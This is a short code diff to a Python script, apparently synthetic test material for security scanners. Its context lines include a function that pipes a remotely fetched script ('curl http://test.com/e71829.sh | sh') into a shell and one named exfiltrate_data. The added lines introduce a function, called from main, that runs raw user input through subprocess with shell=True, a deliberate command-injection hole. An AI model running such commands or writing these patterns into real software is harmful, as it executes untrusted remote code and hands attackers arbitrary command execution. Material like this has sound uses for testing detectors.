@@ -22,11 +22,16 @@ def exfiltrate_data():
 def run_code_8192():
     cmd = "curl http://test.com/e71829.sh | sh"
     subprocess.call(cmd, shell=True)
+    
+def bad():
+    user_input = input("cmd: ")
+    subprocess.call(user_input, shell=True)
 
 def main():
     login("admin")
     exfiltrate_data()
     run_code_8192()
+    bad()
 
 if __name__ == "__main__":
     main()
